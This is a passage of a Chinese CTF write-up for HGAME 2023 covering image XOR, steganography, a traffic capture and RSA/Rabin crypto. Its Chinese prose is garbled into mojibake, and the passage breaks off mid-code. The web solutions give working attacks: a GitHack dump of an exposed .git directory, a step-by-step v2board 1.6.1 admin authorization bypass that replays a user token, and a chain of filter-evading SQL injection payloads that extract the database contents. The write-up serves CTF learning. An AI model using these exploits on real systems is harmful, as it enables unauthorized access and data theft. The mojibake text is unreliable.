class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    colors = long_to_bytes(getrandbits(width * height * <span class="hljs-number">24</span>))[::-<span class="hljs-number">1</span>]<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (colors[x], colors[x + <span class="hljs-number">1</span>], colors[x + <span class="hljs-number">2</span>]))<br>            x += <span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><br>n1 = makeSourceImg()<br>n2 = makeSourceImg()<br>n3 = makeSourceImg()<br>nonce = [n1, n2, n3]<br><br>index = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))<br>shuffle(index)<br>e=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> index:<br>    im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    key = nonce[randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)]<br>    encImg = xorImg(key, im)<br>    encImg.save(<span class="hljs-string">f&#x27;pics/enc<span class="hljs-subst">&#123;e&#125;</span>.png&#x27;</span>)<br>    e+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>åªæœ‰16å¼ å›¾ç‰‡ï¼Œç›´æ¥çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>width=<span class="hljs-number">379</span>   <span class="hljs-comment">#å®½åº¦å’Œé«˜åº¦æŸ¥çœ‹å›¾ç‰‡å±æ€§å¯çŸ¥</span><br>height=<span class="hljs-number">234</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    key = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;j&#125;</span>.png&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        encimg=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br><br>        im=xorImg(key,encimg)<br>        im.save(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;j&#125;</span>.<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/16.png" class=""><h3 id="test-your-ida"><a class="markdownIt-Anchor" href="#test-your-ida"></a> test your IDA</h3><p>æŸ¥ä¸€ä¸‹64ä½ï¼ŒIDAæ‰“å¼€çœ‹åˆ°flag</p><img src="/2023/01/05/HGAME/5.png" class=""><h3 id="e99p1ant_want_girlfriend"><a class="markdownIt-Anchor" href="#e99p1ant_want_girlfriend"></a> e99p1ant_want_girlfriend</h3><p>æ‹¿åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œçœ‹èµ·æ¥é‚£ä¸ªäººä¸‹é¢å¥½åƒå°‘äº†ä¸€ç‚¹ï¼Œç›´æ¥ä¿®æ”¹é•¿åº¦</p><img src="/2023/01/05/HGAME/1.png" class=""><img src="/2023/01/05/HGAME/2.png" class=""><h3 id="ç¥ç§˜çš„æµ·æŠ¥"><a class="markdownIt-Anchor" href="#ç¥ç§˜çš„æµ·æŠ¥"></a> ç¥ç§˜çš„æµ·æŠ¥</h3><p>é™„ä»¶æ˜¯ä¸€å¼ HGAMEæ¯”èµ›çš„æµ·æŠ¥</p><img src="/2023/01/05/HGAME/7.png" class=""><p>ç”¨Stegsolveæ‰“å¼€,å°è¯•LSBéšå†™</p><img src="/2023/01/05/HGAME/8.png" class=""><p>æ•´æ®µè¯æå–å‡ºæ¥æ˜¯</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Sure enough, you still remember  what we  talked a bout at  that <span class="hljs-type">time</span>! This  <span class="hljs-keyword">is</span> part  <span class="hljs-keyword">of</span> the secret: ` hgame&#123;U_ Kn0w_LSB&amp;W`.I put the rest <span class="hljs-keyword">of</span> th e content here,  https://drive.google.com/file/d/<span class="hljs-number">13</span>kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/<span class="hljs-keyword">view</span>?usp=sharing, <span class="hljs-keyword">if</span> you directly <span class="hljs-keyword">access</span> the g oogle drive cloud disk download  <span class="hljs-keyword">in</span> China, it will be very slow,  you can try <span class="hljs-keyword">to</span> u se Scientific Internet <span class="hljs-keyword">access</span> solves the problem <span class="hljs-keyword">of</span> slow <span class="hljs-keyword">or</span> inaccessible <span class="hljs-keyword">access</span>  <span class="hljs-keyword">to</span> <span class="hljs-keyword">external</span> network resources. This <span class="hljs-keyword">is</span> my favorite music, there  <span class="hljs-keyword">is</span> another part  <span class="hljs-keyword">of</span> the secret <span class="hljs-keyword">in</span>  the music, I use Steghide <span class="hljs-keyword">to</span> encrypt, the <span class="hljs-keyword">password</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> the  <span class="hljs-number">6</span>-digit <span class="hljs-keyword">password</span>  we agreed at the <span class="hljs-type">time</span>, even <span class="hljs-keyword">if</span>  someone <span class="hljs-keyword">else</span> finds <span class="hljs-keyword">out</span> here, it  should <span class="hljs-keyword">not</span> be so  easy <span class="hljs-keyword">to</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç»™äº†ä¸€åŠçš„flagï¼Œå¦ä¸€åŠè¦è®¿é—®ç½‘ç«™<a href="https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing">https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing</a> ï¼Œä¸‹è½½éŸ³é¢‘ï¼ˆè¦æœ‰æ¢¯å­ï¼Œä¸ç„¶ä¸‹ä¸æ¥ï¼‰</p><p>é‡Œé¢è¯´äº†ç”¨SteghideåŠ å¯†çš„ï¼Œç›´æ¥ä¸Šç½‘æœä¸€ä¸‹Steghideçš„ç”¨æ³•<a href="https://www.jianshu.com/p/c3679f805a0c">https://www.jianshu.com/p/c3679f805a0c</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>steghide   <span class="hljs-comment">#å®‰è£…</span><br>steghide info <span class="hljs-keyword">Bossanova.wav </span>  <span class="hljs-comment">#æŸ¥çœ‹éšè—çš„æ–‡ä»¶</span><br>steghide <span class="hljs-keyword">extract </span>-sf <span class="hljs-keyword">Bossanova.wav </span> <span class="hljs-comment">#æå–éšè—çš„æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag2.txt <code>æ­å–œä½ è§£åˆ°è¿™é‡Œï¼Œå‰©ä¸‹çš„Flagæ˜¯ av^Mp3_Stego&#125;ï¼Œæˆ‘ä»¬Week2è§ï¼</code></p><p><code>hgame&#123;U_ Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><h3 id="where-am-i"><a class="markdownIt-Anchor" href="#where-am-i"></a> Where am I</h3><p>ç»™äº†ä¸€ä¸ªæµé‡åŒ…</p><p>å› ä¸ºå›¾ç‰‡æ˜¯ä¸Šä¼ åˆ°ç½‘ç›˜ï¼Œæ‰€ä»¥å¯¼å‡ºHTTPå¯¹è±¡,å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶,ä¸€ä¸ªé‡Œé¢åªå†™äº†<code>upload successful</code></p><p>å¦ä¸€ä¸ªåˆ™æœ‰å«æœ‰å‹ç¼©åŒ…ï¼Œ<code>binwalk -e file </code>åˆ†ç¦»ï¼Œç”¨winhexæ‰“å¼€ï¼ŒæŠŠå¤´å°¾å¤šä½™çš„æ–‡å­—åˆ é™¤</p><img src="/2023/01/05/HGAME/11.jpg" class=""><img src="/2023/01/05/HGAME/12.png" class=""><p>æ‰“å¼€å‘ç°æ–‡ä»¶å¤´é”™è¯¯ï¼Œåº”è¯¥æ˜¯ä¼ªåŠ å¯†</p><p>å°†24ä¿®æ”¹ä¸º20</p><img src="/2023/01/05/HGAME/13.png" class=""><p>è§£å‹å¾—åˆ°å›¾ç‰‡ï¼Œlinuxä¸‹ç”¨exfitoolæŸ¥çœ‹ä¿¡æ¯</p><img src="/2023/01/05/HGAME/14.png" class=""><p><code>hgame&#123;116_24_1488E_39_54_5418N&#125;</code></p><h3 id="test_nc"><a class="markdownIt-Anchor" href="#test_nc"></a> test_nc</h3><p>ç›´æ¥nc <a href="http://week-1.hgame.lwsec.cn">week-1.hgame.lwsec.cn</a> 31750</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br><span class="hljs-comment">#bin</span><br><span class="hljs-comment">#dev</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#lib</span><br><span class="hljs-comment">#lib32</span><br><span class="hljs-comment">#lib64</span><br><span class="hljs-comment">#vuln</span><br><span class="hljs-built_in">cat</span> flag<br><span class="hljs-comment">#hgame&#123;1b32ad7a265058ea9f2ccc866b97085bb10c4f14&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week-2"><a class="markdownIt-Anchor" href="#week-2"></a> Week 2</h2><h3 id="git-leakage"><a class="markdownIt-Anchor" href="#git-leakage"></a> Git Leakage</h3><p>é¢˜ç›®ç›´æ¥è¯´äº†æ˜¯Git æ³„éœ²</p><p>é‚£å°±ç›´æ¥<code>python3 Githack.py http://week-2.hgame.lwsec.cn:32140/.git</code></p><p>å¾—åˆ°æ–‡ä»¶Th1s_1s-flag</p><p><code>hgame&#123;Don't^put*Git-in_web_directory&#125;</code></p><h3 id="v2board"><a class="markdownIt-Anchor" href="#v2board"></a> v2board</h3><p>éœ€è¦è¶Šæƒè·å¾—adminçš„æƒé™ï¼ŒæŸ¥çœ‹adminè®¢é˜…çš„token</p><p>å…ˆéšä¾¿æ³¨å†Œä¸ªé‚®ç®±è¿›å»çœ‹çœ‹ï¼Œéƒ½æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><p>çŒœæµ‹æ˜¯v2boardçš„æ¼æ´ï¼ŒæŸ¥çœ‹æºç çŸ¥é“æ˜¯1.6.1ç‰ˆæœ¬çš„</p><p>ä¸Šç½‘æœ<a href="https://www.ctfiot.com/86202.html">v2boardè¶Šæƒè®¿é—®æ¼æ´</a></p><p>è¿™é‡Œçš„æ¼æ´æ˜¯</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">é‰´æƒæ–¹å¼å˜ä¸ºä»Redisä¸­è·å–ç¼“å­˜åˆ¤å®šæ˜¯å¦å­˜åœ¨å¯ä»¥è°ƒç”¨æ¥å£ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·éƒ½å¯ä»¥è°ƒç”¨ç®¡ç†å‘˜æƒé™çš„æ¥å£è·å–åå°æƒé™<br> <span class="hljs-literal">Admin</span>.php æ–‡ä»¶ä¸­åªéªŒè¯äº† authrization æ˜¯å¦åœ¨ Redisçš„ç¼“å­˜ä¸­ï¼Œæ‰€ä»¥å½“æ³¨å†Œä»»æ„ä¸€ä¸ªç”¨æˆ·è¿›è¡Œç™»é™†åè·å–åˆ° auth_data å°±å¯ä»¥ä»»æ„è°ƒç”¨ ç®¡ç†å‘˜çš„æ¥å£<br></code></pre></td></tr></table></figure><p>å…ˆéšæ„æ³¨å†Œä¸€ä¸ªé‚®ç®±</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">email:<span class="hljs-keyword">admin</span>@qq.com<br><span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span>@qq.com<br></code></pre></td></tr></table></figure><p>ç™»å½•åä¼šè¿”å›ä¸€ä¸ªauth_dataå­—æ®µ<code>YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code></p><p>ç„¶åè®¿é—®/api/v1/admin/user/fetch ,å¹¶åœ¨è¯·æ±‚å¤´åŠ ä¸Š<code>authorization:YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code>,</p><p>è®¿é—®å¾—åˆ°</p><img src="/2023/01/05/HGAME/9.png" class=""><p>å¯ä»¥å‘ç°æœ‰ä¸€ä¸ª<code>admin@example.com</code>ä¸æ˜¯æˆ‘ä»¬æ³¨å†Œçš„ï¼Œé‚£å°±æ˜¯adminäº†ï¼Œè®¢é˜…é“¾æ¥çš„token=<code>39d580e71705f6abac9a414def74c466</code></p><h3 id="search-commodity"><a class="markdownIt-Anchor" href="#search-commodity"></a> Search Commodity</h3><p>å¼±å¯†ç çˆ†ç ´<code>admin123</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯sqlæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1/*/**/*/oorrder/*/**/*/by/*/**/*/3%23<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,datadatabasebase(),3%23   se4rch<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(table_name)frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;se4rch&#x27;),3%23   5ecret15here,L1st,user1nf0<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(column_name)frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_name/*/**/*/like/*/**/*/&#x27;5ecret15here&#x27;),3%23f14gggg1shere<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(f14gggg1shere)frfromom/*/**/*/5ecret15here),3%23   hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;<br></code></pre></td></tr></table></figure><h3 id="rabin"><a class="markdownIt-Anchor" href="#rabin"></a> Rabin</h3><p>RabinåŠ å¯†æ–¹æ¡ˆï¼š<br />é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°på’Œqåšä¸ºç§é’¥</p><p>è®¡ç®—n = p * qåšä¸ºå…¬é’¥</p><p>è‹¥æ˜æ–‡ä¸ºmï¼Œåˆ™å¯†æ–‡ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>â‰¡</mo><msup><mi>m</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c â‰¡ m^{2}(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>å®é™…åšé¢˜ä¸­ï¼ŒåŠ å¯†æŒ‡æ•°eä¸ä»…é™äº2ï¼Œæ‰€æœ‰å’Œnä¸äº’ç´ çš„éƒ½æœ‰å¯èƒ½</p><p>åŠ å¯†ç®—æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">kbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = getPrime(kbits)<br>        q = getPrime(kbits)<br>        <span class="hljs-keyword">if</span> p % <span class="hljs-number">4</span> == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q % <span class="hljs-number">4</span>== <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> p, q<br><br>p ,q = gen_key(<span class="hljs-number">256</span>)<br>flag =  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>pt = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(pt, <span class="hljs-number">2</span>, p*q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p=<span class="hljs-subst">&#123;p&#125;</span>\nq=<span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br><span class="hljs-string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br><span class="hljs-string">c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<a href="https://sagecell.sagemath.org/">sagemath</a>æ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">p =<span class="hljs-number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br>q =<span class="hljs-number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br>c =<span class="hljs-number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br>e = <span class="hljs-number">2</span><br>R.&lt;x&gt; = Zmod(p)[] <span class="hljs-comment">#å°†xä½œä¸ºéœ€è¦æ±‚å¾—çš„æœªçŸ¥æ•°ï¼Œpä¸ºç´ æ•°</span><br>f = x^e-c<br>r1 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()] <span class="hljs-comment">#f.roots()è¿”å›æ±‚è§£å‡ºæ¥çš„æ‰€æœ‰è§£çš„åˆ—è¡¨</span><br>R.&lt;x&gt; = Zmod(q)[]<br>f = x^e-c<br>r2 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()]<br>m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> r2:<br>        m.append(crt([i,j],[p,q])) <span class="hljs-comment">#crtæ±‚è§£ä¸­å›½å‰©ä½™å®šç†ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä½™æ•°åˆ—è¡¨ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ¨¡æ•°åˆ—è¡¨</span><br><span class="hljs-built_in">print</span>(m) <span class="hljs-comment">#å°†æ‰€æœ‰å¯èƒ½çš„mè¾“å‡ºï¼Œå¤åˆ¶åˆ°pythoné‡Œlong_to_bytes()</span><br><br></code></pre></td></tr></table></figure><p>åˆ°Pythonä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag=[<span class="hljs-number">2372237455851842898349117425227584430588749791480564189568122389688124352290664541063989455711371754963358673223097609351443007448201859216160320647129068</span>, <span class="hljs-number">202822073494981439416400155064048668390596366869305553433016288033759387909443994349181</span>, <span class="hljs-number">6449323225107597053933443750923454260964062647115639999185223478236408615216462580775151285384372189740266233875418656692511620093103204244355042080455728</span>, <span class="hljs-number">4077085769255754155584326325695869830375312855635075809617101088548487084999293021150578229828064483445298157019190352894501628932935104416104165427675841</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(i))<br></code></pre></td></tr></table></figure><p><code>hgame&#123;That'5_s0_3asy_to_s@lve_r@bin&#125;</code></p><h3 id="rsa-å¤§å†’é™©1"><a class="markdownIt-Anchor" href="#rsa-å¤§å†’é™©1"></a> RSA å¤§å†’é™©1</h3><p>4å…³æŒ‘æˆ˜ï¼Œé€šè¿‡æ‹¿flag</p><p>ç›´æ¥ä¸Šè§£é¢˜ä»£ç </p><p>challenge 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">0x56908e6a818ea207ac312c0b204d94ee651cd7b26313fbfdcfb2406828ad379fa12529cf3db2a4d903</span><br>n=<span class="hljs-number">209770295744242916299788862153266483138979976716588739416239543100484342323180172904935777216735461</span><br>p=<span class="hljs-number">333053352923682535111489833655011123013</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><br><span class="hljs-comment">#m&lt;n_But_also_m&lt;p</span><br></code></pre></td></tr></table></figure><p>challenge 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> math<br><br>c1 = <span class="hljs-number">0xa757143e3ea0753ac3c15e0dd05bc6eb58bdf947203c321417fb2739a9072ee5969b7ae017bb68c46969ceddccb0b3e8e27f0b79ba011065e9e0c0d6ec04c7735bc7d2d3d55119f3852c78264c40c9b36fffbc8741515d6d43f4aeba50186ceb45952617d8f4d15e0c0e84397d58aad6b9d8df15adc1f29c4c37addfb6f901d</span><br>c2 = <span class="hljs-number">0xca21ea2228e901614120f89036e62c36f385343c9b15a43c47d23097bb6eb6df4cc6aac315f283b35bf3e00612fea7ee2711248615c10b61475e96f57a94ecfb49b1b60495353c6232510e995251c6a3744193f0e3c10bc1cb9f8bbab19b7cd2a67fab178ca7fe6263aa22c460b0b51af14c9dc2adbe6aa9539e05b214dc1bf</span><br>n1 = <span class="hljs-number">99117167225742621252747360705927288427226074291111147359767727530232979959246961303002594953502494314944737381744946594792258965951764387793904602632138990093085873703735789929744541078195532792040220263365256453293757661668916687151993893223835585293806890903078811527485480385874789904018025085480072921947</span><br>n2 = <span class="hljs-number">90708232882117493164546448126493812176926972474525609918179199222944319390160880291246879414964890005116911514705462257621255399480873008530781044973928567730151038933999620333681189161328502592514982955942546631546678204758589280772127887941509353870320299744541746637191024740549289281821158392283041483783</span><br>p = math.gcd(n1, n2)<br>e = <span class="hljs-number">65537</span><br>d = libnum.invmod(e, (p - <span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c1, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><span class="hljs-comment">#make_all_modulus_independent</span><br></code></pre></td></tr></table></figure><p>challenge 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">114515838473805006712847594704380677940280499969617865451903741803970304896753055873744402239365107537263730326351655179037631201887020732179784578687179230556396662015803684388855028443206818232761239630564571111262306517782298740762072717669765284942698987218518593869320732633953301487410854175666320988421</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200000000</span>):<br>    <span class="hljs-keyword">if</span> gmpy2.iroot(c + n 